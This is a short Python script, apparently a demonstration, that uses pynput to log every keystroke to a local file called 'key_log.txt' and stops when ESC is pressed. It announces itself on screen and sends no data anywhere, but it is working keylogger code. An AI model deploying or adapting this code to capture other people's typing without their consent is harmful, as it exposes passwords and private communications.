from pynput import keyboard

# File to store the keystrokes
LOG_FILE = "key_log.txt"

def on_press(key):
    try:
        with open(LOG_FILE, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(LOG_FILE, "a") as f:
            f.write(f" [{key}] ")

def on_release(key):
    # Stop the keylogger when ESC is pressed
    if key == keyboard.Key.esc:
        print("🛑 ESC pressed. Stopping keylogger...")
        return False  # This stops the listener

def main():
    print("🔐 Keylogger is running... Press ESC to stop.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
